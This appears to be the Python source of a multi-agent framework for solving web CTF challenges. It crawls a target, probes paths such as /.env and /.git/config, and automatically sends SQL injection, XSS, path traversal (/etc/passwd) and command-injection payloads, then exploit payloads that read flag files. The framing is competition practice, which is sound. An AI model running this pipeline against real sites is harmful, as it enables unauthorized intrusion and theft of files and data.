#!/usr/bin/env python3
"""
CTF 多Agent协作框架 v1.0

核心架构:
- Explorer Agent: 页面探索和资产发现
- Scanner Agent: 漏洞扫描和POC验证
- Solutioner Agent: 解题策略和方案生成
- Executor Agent: 攻击执行和Payload投递
- Actioner Agent: 动作执行和结果收集

特性:
- Agent间消息传递和状态同步
- 任务分发和优先级调度
- 并发执行和资源管理
- Flag自动检测和提取

作者: SeaOf0
"""

import re
import asyncio
import logging
import hashlib
import json
from abc import ABC, abstractmethod
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Any, Callable, Set, Union, Type
from enum import Enum
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock, Event
from urllib.parse import urljoin, urlparse
import urllib.request
import urllib.error
import queue

logger = logging.getLogger(__name__)


# ==================== 消息系统 ====================

class MessageType(Enum):
    """消息类型"""
    PURE = "pure"  # 纯文本消息
    PAGE = "page"  # 页面信息
    VULNERABILITY = "vulnerability"  # 漏洞信息
    SUMMARY = "summary"  # 汇总信息
    SOLUTION = "solution"  # 解决方案
    FLAG = "flag"  # Flag发现
    TASK = "task"  # 任务分配
    STATUS = "status"  # 状态更新
    ERROR = "error"  # 错误消息


class MessagePriority(Enum):
    """消息优先级"""
    LOW = 1
    NORMAL = 2
    HIGH = 3
    CRITICAL = 4


@dataclass
class AgentMessage:
    """Agent消息"""
    id: str
    type: MessageType
    sender: str
    receiver: str  # "all" for broadcast
    content: Any
    priority: MessagePriority = MessagePriority.NORMAL
    timestamp: str = field(default_factory=lambda: datetime.now().isoformat())
    metadata: Dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> Dict:
        return {
            "id": self.id,
            "type": self.type.value,
            "sender": self.sender,
            "receiver": self.receiver,
            "content": self.content,
            "priority": self.priority.value,
            "timestamp": self.timestamp,
            "metadata": self.metadata
        }


class MessageBus:
    """消息总线 - Agent间通信"""

    def __init__(self):
        self._subscribers: Dict[str, List[Callable]] = {}
        self._messages: List[AgentMessage] = []
        self._lock = Lock()
        self._message_queue: queue.PriorityQueue = queue.PriorityQueue()

    def subscribe(self, agent_id: str, callback: Callable[[AgentMessage], None]):
        """订阅消息"""
        with self._lock:
            if agent_id not in self._subscribers:
                self._subscribers[agent_id] = []
            self._subscribers[agent_id].append(callback)

    def unsubscribe(self, agent_id: str):
        """取消订阅"""
        with self._lock:
            if agent_id in self._subscribers:
                del self._subscribers[agent_id]

    def publish(self, message: AgentMessage):
        """发布消息"""
        with self._lock:
            self._messages.append(message)
            # 优先级队列: (优先级取反, 时间戳, 消息)
            self._message_queue.put(
                (-message.priority.value, message.timestamp, message)
            )

        # 通知订阅者
        receivers = [message.receiver] if message.receiver != "all" else list(self._subscribers.keys())
        for receiver in receivers:
            if receiver in self._subscribers:
                for callback in self._subscribers[receiver]:
                    try:
                        callback(message)
                    except Exception as e:
                        logger.error(f"消息处理失败: {e}")

    def get_messages(
        self,
        agent_id: str = None,
        message_type: MessageType = None,
        limit: int = 100
    ) -> List[AgentMessage]:
        """获取消息"""
        with self._lock:
            messages = self._messages.copy()

        if agent_id:
            messages = [m for m in messages if m.receiver == agent_id or m.receiver == "all"]

        if message_type:
            messages = [m for m in messages if m.type == message_type]

        return messages[-limit:]


# ==================== Agent基类 ====================

class AgentStatus(Enum):
    """Agent状态"""
    IDLE = "idle"
    RUNNING = "running"
    WAITING = "waiting"
    COMPLETED = "completed"
    ERROR = "error"
    STOPPED = "stopped"


@dataclass
class AgentContext:
    """Agent上下文"""
    target_url: str
    task_id: str
    session_id: str
    discovered_pages: List[Dict] = field(default_factory=list)
    discovered_vulns: List[Dict] = field(default_factory=list)
    key_info: List[str] = field(default_factory=list)
    flags: List[str] = field(default_factory=list)
    explored_urls: Set[str] = field(default_factory=set)
    metadata: Dict[str, Any] = field(default_factory=dict)


class BaseAgent(ABC):
    """Agent基类"""

    def __init__(
        self,
        agent_id: str,
        name: str,
        message_bus: MessageBus,
        max_workers: int = 5
    ):
        self.agent_id = agent_id
        self.name = name
        self.message_bus = message_bus
        self.max_workers = max_workers
        self.status = AgentStatus.IDLE
        self.context: Optional[AgentContext] = None
        self._stop_event = Event()
        self._executor = ThreadPoolExecutor(max_workers=max_workers)

        # 订阅消息
        self.message_bus.subscribe(agent_id, self._on_message)

    def _on_message(self, message: AgentMessage):
        """处理接收到的消息"""
        try:
            self.handle_message(message)
        except Exception as e:
            logger.error(f"Agent {self.name} 处理消息失败: {e}")

    @abstractmethod
    def handle_message(self, message: AgentMessage):
        """处理消息 - 子类实现"""
        pass

    @abstractmethod
    async def run(self, context: AgentContext) -> Dict[str, Any]:
        """执行Agent任务 - 子类实现"""
        pass

    def send_message(
        self,
        message_type: MessageType,
        content: Any,
        receiver: str = "all",
        priority: MessagePriority = MessagePriority.NORMAL,
        metadata: Dict = None
    ):
        """发送消息"""
        message = AgentMessage(
            id=hashlib.md5(f"{self.agent_id}{datetime.now().isoformat()}".encode()).hexdigest()[:12],
            type=message_type,
            sender=self.agent_id,
            receiver=receiver,
            content=content,
            priority=priority,
            metadata=metadata or {}
        )
        self.message_bus.publish(message)
        return message

    def update_status(self, status: AgentStatus, detail: str = ""):
        """更新状态"""
        self.status = status
        self.send_message(
            MessageType.STATUS,
            {"status": status.value, "detail": detail},
            priority=MessagePriority.LOW
        )

    def stop(self):
        """停止Agent"""
        self._stop_event.set()
        self.update_status(AgentStatus.STOPPED)

    def is_stopped(self) -> bool:
        """检查是否已停止"""
        return self._stop_event.is_set()


# ==================== Flag检测器 ====================

class FlagDetector:
    """Flag检测器"""

    # 常见Flag格式
    FLAG_PATTERNS = [
        r'flag\{[^}]+\}',
        r'FLAG\{[^}]+\}',
        r'ctf\{[^}]+\}',
        r'CTF\{[^}]+\}',
        r'DASCTF\{[^}]+\}',
        r'SCTF\{[^}]+\}',
        r'HCTF\{[^}]+\}',
        r'CISCN\{[^}]+\}',
        r'[a-f0-9]{32}',  # MD5
        r'[a-f0-9]{64}',  # SHA256
    ]

    def __init__(self, custom_patterns: List[str] = None):
        self.patterns = self.FLAG_PATTERNS.copy()
        if custom_patterns:
            self.patterns.extend(custom_patterns)

        self.compiled_patterns = [re.compile(p, re.IGNORECASE) for p in self.patterns]
        self.found_flags: Set[str] = set()

    def detect(self, content: str) -> List[Dict[str, Any]]:
        """检测Flag"""
        flags = []

        for i, pattern in enumerate(self.compiled_patterns):
            matches = pattern.findall(content)
            for match in matches:
                if match not in self.found_flags:
                    self.found_flags.add(match)
                    flags.append({
                        "flag": match,
                        "pattern": self.patterns[i],
                        "confidence": self._calculate_confidence(match),
                        "timestamp": datetime.now().isoformat()
                    })

        return flags

    def _calculate_confidence(self, flag: str) -> float:
        """计算Flag置信度"""
        # flag{...} 格式置信度最高
        if re.match(r'^(flag|ctf|DASCTF|SCTF)\{.*\}$', flag, re.IGNORECASE):
            return 1.0
        # 纯哈希格式置信度较低
        if re.match(r'^[a-f0-9]{32,64}$', flag):
            return 0.5
        return 0.7


# ==================== Explorer Agent ====================

class ExplorerAgent(BaseAgent):
    """页面探索Agent"""

    # 黑名单扩展名
    BLACKLIST_EXT = ['.css', '.png', '.jpg', '.jpeg', '.gif', '.ico', '.svg', '.woff', '.woff2', '.ttf']

    # 黑名单路径
    BLACKLIST_PATH = ['logout', 'signout', 'exit']

    def __init__(self, agent_id: str, message_bus: MessageBus, max_workers: int = 10):
        super().__init__(agent_id, "Explorer", message_bus, max_workers)
        self.explored_urls: Set[str] = set()
        self.page_hashes: Set[str] = set()

    def handle_message(self, message: AgentMessage):
        """处理消息"""
        if message.type == MessageType.VULNERABILITY:
            # 收到漏洞信息，可能需要探索更多页面
            vuln_data = message.content
            if "url" in vuln_data:
                logger.info(f"Explorer收到漏洞信息，URL: {vuln_data['url']}")

    async def run(self, context: AgentContext) -> Dict[str, Any]:
        """执行页面探索"""
        self.context = context
        self.update_status(AgentStatus.RUNNING, "开始页面探索")

        try:
            # 1. 访问初始URL
            initial_pages = await self._explore_initial(context.target_url)

            # 2. 提取JS文件
            js_apis = await self._extract_js_apis(initial_pages)

            # 3. 路径猜测
            guessed_pages = await self._guess_paths(context.target_url)

            # 4. 递归探索
            all_pages = initial_pages + guessed_pages
            explored_pages = await self._recursive_explore(all_pages)

            # 5. 收集结果
            result = {
                "explored_count": len(explored_pages),
                "pages": explored_pages,
                "js_apis": js_apis,
                "key_info": list(context.key_info)
            }

            # 发送探索结果
            self.send_message(
                MessageType.SUMMARY,
                result,
                priority=MessagePriority.HIGH
            )

            self.update_status(AgentStatus.COMPLETED, f"探索完成，发现 {len(explored_pages)} 个页面")
            return result

        except Exception as e:
            logger.error(f"Explorer执行失败: {e}")
            self.update_status(AgentStatus.ERROR, str(e))
            return {"error": str(e)}

    async def _explore_initial(self, url: str) -> List[Dict]:
        """探索初始URL"""
        pages = []

        try:
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=10) as resp:
                content = resp.read().decode("utf-8", errors="ignore")
                status = resp.status
                headers = dict(resp.headers)
            page_data = {
                "url": url,
                "method": "GET",
                "status": status,
                "content": content[:5000],
                "headers": headers
            }
            pages.append(page_data)

            # 检测Flag
            if self.context:
                flag_detector = FlagDetector()
                flags = flag_detector.detect(content)
                if flags:
                    self.send_message(MessageType.FLAG, flags, priority=MessagePriority.CRITICAL)
                    self.context.flags.extend([f["flag"] for f in flags])

        except Exception as e:
            logger.error(f"初始探索失败: {e}")

        return pages

    async def _extract_js_apis(self, pages: List[Dict]) -> Dict[str, List[str]]:
        """提取JS文件中的API端点"""
        apis = {}

        js_patterns = [
            r'<script[^>]+src=["\']([^"\']+)["\'][^>]*>',
            r'src=["\']([^"\']*\.js[^"\']*)["\']',
        ]

        for page in pages:
            content = page.get("content", "")
            page_url = page.get("url", "")

            for pattern in js_patterns:
                matches = re.findall(pattern, content, re.IGNORECASE)
                for match in matches:
                    if match.startswith(('http://', 'https://')):
                        js_url = match
                    elif match.startswith('/'):
                        parsed = urlparse(page_url)
                        js_url = f"{parsed.scheme}://{parsed.netloc}{match}"
                    else:
                        js_url = urljoin(page_url, match)

                    # 跳过黑名单
                    if any(bl in js_url.lower() for bl in ['bootstrap', 'jquery', 'vue', 'react']):
                        continue

                    # 尝试获取JS内容并提取API端点
                    try:
                        req = urllib.request.Request(js_url, headers={"User-Agent": "Mozilla/5.0"})
                        with urllib.request.urlopen(req, timeout=5) as resp:
                            js_content = resp.read().decode("utf-8", errors="ignore")
                        api_patterns = [
                            r'["\'](\/[a-zA-Z0-9_\-\/]+(?:\?[^"\']*)?)["\']]',
                            r'(?:fetch|axios|get|post)\(["\'](\/[^"\'\ )]+)',
                            r'url:\s*["\'](\/[^"\'\ )]+)',
                        ]
                        found_apis = []
                        for pat in api_patterns:
                            found_apis.extend(re.findall(pat, js_content))
                        apis[js_url] = list(set(found_apis))
                    except Exception:
                        apis[js_url] = []

        return apis

    async def _guess_paths(self, base_url: str) -> List[Dict]:
        """猜测常见路径"""
        common_paths = [
            '/robots.txt', '/.git/config', '/.env', '/admin', '/api',
            '/login', '/register', '/upload', '/flag', '/flag.txt',
            '/admin/login', '/api/v1', '/api/v2', '/swagger', '/docs'
        ]

        pages = []
        parsed = urlparse(base_url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        # 并发检查路径
        async def check_path(path):
            url = f"{base}{path}"
            if url in self.explored_urls:
                return None

            self.explored_urls.add(url)
            try:
                req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
                with urllib.request.urlopen(req, timeout=5) as resp:
                    content = resp.read().decode("utf-8", errors="ignore")
                    return {
                        "url": url,
                        "method": "GET",
                        "status": resp.status,
                        "content": content[:3000],
                        "headers": dict(resp.headers)
                    }
            except urllib.error.HTTPError as e:
                if e.code < 404:
                    return {"url": url, "method": "GET", "status": e.code, "content": "", "headers": {}}
                return None
            except Exception:
                return None

        tasks = [check_path(p) for p in common_paths]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        for result in results:
            if result and not isinstance(result, Exception):
                pages.append(result)

        return pages

    async def _recursive_explore(self, pages: List[Dict], depth: int = 3) -> List[Dict]:
        """递归探索页面"""
        explored = []

        for page in pages:
            url = page.get("url", "")
            content = page.get("content", "")

            # 计算页面哈希避免重复
            page_hash = hashlib.md5(content.encode()).hexdigest()
            if page_hash in self.page_hashes:
                continue
            self.page_hashes.add(page_hash)

            explored.append(page)

            # 发送页面消息
            self.send_message(MessageType.PAGE, page)

            # 更新上下文
            if self.context:
                self.context.discovered_pages.append(page)

        return explored

    def _is_blacklisted(self, url: str) -> bool:
        """检查URL是否在黑名单"""
        url_lower = url.lower()

        for ext in self.BLACKLIST_EXT:
            if url_lower.endswith(ext):
                return True

        for path in self.BLACKLIST_PATH:
            if path in url_lower:
                return True

        return False


# ==================== Scanner Agent ====================

class ScannerAgent(BaseAgent):
    """漏洞扫描Agent"""

    def __init__(self, agent_id: str, message_bus: MessageBus, max_workers: int = 5):
        super().__init__(agent_id, "Scanner", message_bus, max_workers)
        self.vuln_results: List[Dict] = []

    def handle_message(self, message: AgentMessage):
        """处理消息"""
        if message.type == MessageType.PAGE:
            # 收到新页面，加入扫描队列
            page = message.content
            logger.debug(f"Scanner收到新页面: {page.get('url', 'unknown')}")

    async def run(self, context: AgentContext) -> Dict[str, Any]:
        """执行漏洞扫描"""
        self.context = context
        self.update_status(AgentStatus.RUNNING, "开始漏洞扫描")

        try:
            pages = context.discovered_pages
            vulns = []

            # 并发扫描每个页面
            tasks = [self._scan_page(page) for page in pages]
            results = await asyncio.gather(*tasks, return_exceptions=True)

            for result in results:
                if result and not isinstance(result, Exception):
                    vulns.extend(result)

            # 发送漏洞汇总
            self.send_message(
                MessageType.SUMMARY,
                {"vulns": vulns, "count": len(vulns)},
                priority=MessagePriority.HIGH
            )

            self.update_status(AgentStatus.COMPLETED, f"扫描完成，发现 {len(vulns)} 个漏洞")

            return {"vulns": vulns}

        except Exception as e:
            logger.error(f"Scanner执行失败: {e}")
            self.update_status(AgentStatus.ERROR, str(e))
            return {"error": str(e)}

    async def _scan_page(self, page: Dict) -> List[Dict]:
        """扫描单个页面"""
        vulns = []
        url = page.get("url", "")
        content = page.get("content", "")

        # SQL注入检测
        sqli_vulns = await self._detect_sqli(page)
        vulns.extend(sqli_vulns)

        # XSS检测
        xss_vulns = await self._detect_xss(page)
        vulns.extend(xss_vulns)

        # LFI检测
        lfi_vulns = await self._detect_lfi(page)
        vulns.extend(lfi_vulns)

        # 命令注入检测
        cmdi_vulns = await self._detect_cmdi(page)
        vulns.extend(cmdi_vulns)

        # 发送漏洞消息
        for vuln in vulns:
            self.send_message(
                MessageType.VULNERABILITY,
                vuln,
                priority=MessagePriority.HIGH
            )

            if self.context:
                self.context.discovered_vulns.append(vuln)

        return vulns

    def _http_get(self, url: str, timeout: int = 5) -> Optional[str]:
        """发送 GET 请求，返回响应文本"""
        try:
            req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                return resp.read().decode("utf-8", errors="ignore")
        except Exception:
            return None

    def _inject_param(self, url: str, payload: str) -> str:
        """将 payload 附加到 URL 的第一个查询参数值"""
        from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
        parsed = urlparse(url)
        if not parsed.query:
            return url + ("?q=" + urllib.parse.quote(payload) if "?" not in url else "&q=" + urllib.parse.quote(payload))
        parts = parsed.query.split("&")
        first_key = parts[0].split("=")[0]
        new_query = first_key + "=" + urllib.parse.quote(payload) + ("&" + "&".join(parts[1:]) if len(parts) > 1 else "")
        return urlunparse(parsed._replace(query=new_query))

    async def _detect_sqli(self, page: Dict) -> List[Dict]:
        """检测SQL注入 - 基于报错特征"""
        vulns = []
        url = page.get("url", "")
        if not url or "?" not in url:
            return vulns
        sqli_payloads = ["'", "'--", "' OR '1'='1", "\""]
        error_patterns = [
            r"sql syntax", r"mysql_fetch", r"ORA-\d+", r"SQLite",
            r"syntax error", r"Warning.*mysql", r"unclosed quotation",
            r"pg_query", r"SQLSTATE"
        ]
        for payload in sqli_payloads:
            test_url = self._inject_param(url, payload)
            body = self._http_get(test_url)
            if body:
                for pat in error_patterns:
                    if re.search(pat, body, re.IGNORECASE):
                        vulns.append({"type": "sqli", "url": url, "payload": payload, "evidence": pat})
                        return vulns  # 找到即返回
        return vulns

    async def _detect_xss(self, page: Dict) -> List[Dict]:
        """检测XSS - 基于反射特征"""
        vulns = []
        url = page.get("url", "")
        if not url or "?" not in url:
            return vulns
        marker = "<script>alert(1)</script>"
        test_url = self._inject_param(url, marker)
        body = self._http_get(test_url)
        if body and marker in body:
            vulns.append({"type": "xss", "url": url, "payload": marker, "evidence": "reflected"})
        return vulns

    async def _detect_lfi(self, page: Dict) -> List[Dict]:
        """检测LFI - 尝试读取 /etc/passwd"""
        vulns = []
        url = page.get("url", "")
        if not url or "?" not in url:
            return vulns
        lfi_payloads = ["../../../etc/passwd", "....//....//....//etc/passwd", "/etc/passwd"]
        for payload in lfi_payloads:
            test_url = self._inject_param(url, payload)
            body = self._http_get(test_url)
            if body and re.search(r"root:.*:0:0:", body):
                vulns.append({"type": "lfi", "url": url, "payload": payload, "evidence": "passwd_found"})
                return vulns
        return vulns

    async def _detect_cmdi(self, page: Dict) -> List[Dict]:
        """检测命令注入 - 基于时间延迟或输出特征"""
        vulns = []
        url = page.get("url", "")
        if not url or "?" not in url:
            return vulns
        cmdi_payloads = [";id", "|id", "`id`", "$(id)"]
        for payload in cmdi_payloads:
            test_url = self._inject_param(url, payload)
            body = self._http_get(test_url)
            if body and re.search(r"uid=\d+", body):
                vulns.append({"type": "cmdi", "url": url, "payload": payload, "evidence": "uid_found"})
                return vulns
        return vulns


# ==================== Solutioner Agent ====================

class SolutionerAgent(BaseAgent):
    """解题策略Agent"""

    def __init__(self, agent_id: str, message_bus: MessageBus):
        super().__init__(agent_id, "Solutioner", message_bus, max_workers=3)
        self.solutions: List[Dict] = []

    def handle_message(self, message: AgentMessage):
        """处理消息"""
        if message.type == MessageType.VULNERABILITY:
            # 收到漏洞，生成解决方案
            vuln = message.content
            self._generate_solution(vuln)

    def _generate_solution(self, vuln: Dict):
        """生成解决方案"""
        vuln_type = vuln.get("type", "unknown")
        url = vuln.get("url", "")

        solution = {
            "vuln_id": vuln.get("id"),
            "vuln_type": vuln_type,
            "url": url,
            "steps": [],
            "payloads": [],
            "post_exploitation": []
        }

        # 根据漏洞类型生成解决方案
        if vuln_type == "sqli":
            solution["steps"] = [
                "1. 使用sqlmap确认注入点",
                "2. 获取数据库信息",
                "3. 枚举表和列",
                "4. 提取Flag数据"
            ]
            solution["payloads"] = ["' OR 1=1--", "' UNION SELECT NULL--"]

        elif vuln_type == "lfi":
            solution["steps"] = [
                "1. 确认LFI漏洞",
                "2. 尝试读取/etc/passwd",
                "3. 寻找flag文件",
                "4. 尝试日志注入RCE"
            ]
            solution["payloads"] = ["../../../etc/passwd", "php://filter/convert.base64-encode/resource="]

        elif vuln_type == "rce":
            solution["steps"] = [
                "1. 确认命令执行",
                "2. 列出根目录",
                "3. 寻找flag文件",
                "4. 读取flag内容"
            ]
            solution["payloads"] = ["; ls /", "`cat /flag*`", "$(cat /flag.txt)"]

        self.solutions.append(solution)

        # 发送解决方案
        self.send_message(
            MessageType.SOLUTION,
            solution,
            priority=MessagePriority.HIGH
        )

    async def run(self, context: AgentContext) -> Dict[str, Any]:
        """执行解题分析"""
        self.context = context
        self.update_status(AgentStatus.RUNNING, "开始分析解题策略")

        try:
            # 分析所有发现的漏洞
            for vuln in context.discovered_vulns:
                self._generate_solution(vuln)

            result = {
                "solutions_count": len(self.solutions),
                "solutions": self.solutions
            }

            self.update_status(AgentStatus.COMPLETED, f"生成 {len(self.solutions)} 个解决方案")
            return result

        except Exception as e:
            logger.error(f"Solutioner执行失败: {e}")
            self.update_status(AgentStatus.ERROR, str(e))
            return {"error": str(e)}


# ==================== Executor Agent ====================

class ExecutorAgent(BaseAgent):
    """攻击执行Agent"""

    def __init__(self, agent_id: str, message_bus: MessageBus, max_workers: int = 3):
        super().__init__(agent_id, "Executor", message_bus, max_workers)
        self.execution_results: List[Dict] = []

    def handle_message(self, message: AgentMessage):
        """处理消息"""
        if message.type == MessageType.SOLUTION:
            # 收到解决方案，准备执行
            solution = message.content
            logger.info(f"Executor收到解决方案: {solution.get('vuln_type')}")

    async def run(self, context: AgentContext) -> Dict[str, Any]:
        """执行攻击"""
        self.context = context
        self.update_status(AgentStatus.RUNNING, "开始执行攻击")

        try:
            results = []

            # 获取解决方案消息
            solution_messages = self.message_bus.get_messages(
                agent_id=self.agent_id,
                message_type=MessageType.SOLUTION
            )

            for msg in solution_messages:
                solution = msg.content
                result = await self._execute_solution(solution)
                results.append(result)

                # 检测Flag
                if result.get("response"):
                    flag_detector = FlagDetector()
                    flags = flag_detector.detect(str(result.get("response", "")))
                    if flags:
                        self.send_message(MessageType.FLAG, flags, priority=MessagePriority.CRITICAL)
                        context.flags.extend([f["flag"] for f in flags])

            self.update_status(AgentStatus.COMPLETED, f"执行完成，共 {len(results)} 个攻击")
            return {"results": results}

        except Exception as e:
            logger.error(f"Executor执行失败: {e}")
            self.update_status(AgentStatus.ERROR, str(e))
            return {"error": str(e)}

    async def _execute_solution(self, solution: Dict) -> Dict:
        """执行解决方案"""
        vuln_type = solution.get("vuln_type", "")
        url = solution.get("url", "")
        payloads = solution.get("payloads", [])

        result = {
            "vuln_type": vuln_type,
            "url": url,
            "success": False,
            "response": None,
            "flag": None
        }

        # 执行payload，发送实际HTTP请求
        for payload in payloads:
            logger.debug(f"执行Payload: {payload}")
            try:
                test_url = url
                if "?" in url:
                    from urllib.parse import urlparse, urlunparse
                    parsed = urlparse(url)
                    parts = parsed.query.split("&")
                    first_key = parts[0].split("=")[0] if parts[0] else "q"
                    new_query = first_key + "=" + urllib.parse.quote(str(payload)) + ("&" + "&".join(parts[1:]) if len(parts) > 1 else "")
                    test_url = urlunparse(parsed._replace(query=new_query))
                req = urllib.request.Request(test_url, headers={"User-Agent": "Mozilla/5.0"})
                with urllib.request.urlopen(req, timeout=8) as resp:
                    body = resp.read().decode("utf-8", errors="ignore")
                result["response"] = body[:2000]
                # 检测Flag
                flag_detector = FlagDetector()
                flags = flag_detector.detect(body)
                if flags:
                    result["success"] = True
                    result["flag"] = flags[0]["flag"]
                    break
            except Exception as e:
                logger.debug(f"Payload执行异常: {e}")

        return result


# ==================== CTF协调器 ====================

class CTFCoordinator:
    """CTF多Agent协调器"""

    def __init__(self):
        self.message_bus = MessageBus()
        self.agents: Dict[str, BaseAgent] = {}
        self.context: Optional[AgentContext] = None
        self.flag_detector = FlagDetector()
        self._running = False

    def add_agent(self, agent: BaseAgent):
        """添加Agent"""
        self.agents[agent.agent_id] = agent
        logger.info(f"添加Agent: {agent.name} ({agent.agent_id})")

    def remove_agent(self, agent_id: str):
        """移除Agent"""
        if agent_id in self.agents:
            agent = self.agents[agent_id]
            agent.stop()
            self.message_bus.unsubscribe(agent_id)
            del self.agents[agent_id]

    def create_default_agents(self) -> List[BaseAgent]:
        """创建默认Agent组"""
        agents = [
            ExplorerAgent("explorer-001", self.message_bus),
            ScannerAgent("scanner-001", self.message_bus),
            SolutionerAgent("solutioner-001", self.message_bus),
            ExecutorAgent("executor-001", self.message_bus)
        ]

        for agent in agents:
            self.add_agent(agent)

        return agents

    async def solve(
        self,
        target_url: str,
        task_id: str = None,
        timeout: int = 300,
        custom_flag_patterns: List[str] = None
    ) -> Dict[str, Any]:
        """执行CTF解题"""
        self._running = True

        # 创建上下文
        self.context = AgentContext(
            target_url=target_url,
            task_id=task_id or hashlib.md5(target_url.encode()).hexdigest()[:8],
            session_id=hashlib.md5(f"{target_url}{datetime.now().isoformat()}".encode()).hexdigest()[:12]
        )

        # 添加自定义Flag模式
        if custom_flag_patterns:
            self.flag_detector = FlagDetector(custom_flag_patterns)

        logger.info(f"开始CTF解题: {target_url}")

        try:
            # 阶段1: 页面探索
            if "explorer-001" in self.agents:
                explorer = self.agents["explorer-001"]
                explore_result = await asyncio.wait_for(
                    explorer.run(self.context),
                    timeout=timeout // 4
                )
                logger.info(f"探索完成: {explore_result.get('explored_count', 0)} 个页面")

            # 阶段2: 漏洞扫描
            if "scanner-001" in self.agents:
                scanner = self.agents["scanner-001"]
                scan_result = await asyncio.wait_for(
                    scanner.run(self.context),
                    timeout=timeout // 4
                )
                logger.info(f"扫描完成: {len(scan_result.get('vulns', []))} 个漏洞")

            # 阶段3: 生成解决方案
            if "solutioner-001" in self.agents:
                solutioner = self.agents["solutioner-001"]
                solution_result = await asyncio.wait_for(
                    solutioner.run(self.context),
                    timeout=timeout // 4
                )
                logger.info(f"方案生成: {solution_result.get('solutions_count', 0)} 个方案")

            # 阶段4: 执行攻击
            if "executor-001" in self.agents:
                executor = self.agents["executor-001"]
                exec_result = await asyncio.wait_for(
                    executor.run(self.context),
                    timeout=timeout // 4
                )
                logger.info(f"执行完成: {len(exec_result.get('results', []))} 个攻击")

            # 汇总结果
            result = {
                "target_url": target_url,
                "task_id": self.context.task_id,
                "flags": self.context.flags,
                "pages_discovered": len(self.context.discovered_pages),
                "vulns_discovered": len(self.context.discovered_vulns),
                "success": len(self.context.flags) > 0
            }

            logger.info(f"CTF解题完成，发现 {len(self.context.flags)} 个Flag")
            return result

        except asyncio.TimeoutError:
            logger.warning("CTF解题超时")
            return {
                "target_url": target_url,
                "error": "timeout",
                "flags": self.context.flags if self.context else []
            }

        except Exception as e:
            logger.error(f"CTF解题失败: {e}")
            return {
                "target_url": target_url,
                "error": str(e),
                "flags": self.context.flags if self.context else []
            }

        finally:
            self._running = False

    def stop(self):
        """停止所有Agent"""
        self._running = False
        for agent in self.agents.values():
            agent.stop()


# 便捷函数
def create_ctf_coordinator() -> CTFCoordinator:
    """创建CTF协调器"""
    coordinator = CTFCoordinator()
    coordinator.create_default_agents()
    return coordinator


async def quick_ctf_solve(
    target_url: str,
    timeout: int = 300,
    custom_flag_patterns: List[str] = None
) -> Dict[str, Any]:
    """快速CTF解题"""
    coordinator = create_ctf_coordinator()
    try:
        return await coordinator.solve(
            target_url=target_url,
            timeout=timeout,
            custom_flag_patterns=custom_flag_patterns
        )
    finally:
        coordinator.stop()


# 导出
__all__ = [
    "MessageType",
    "MessagePriority",
    "AgentMessage",
    "MessageBus",
    "AgentStatus",
    "AgentContext",
    "BaseAgent",
    "FlagDetector",
    "ExplorerAgent",
    "ScannerAgent",
    "SolutionerAgent",
    "ExecutorAgent",
    "CTFCoordinator",
    "create_ctf_coordinator",
    "quick_ctf_solve",
]
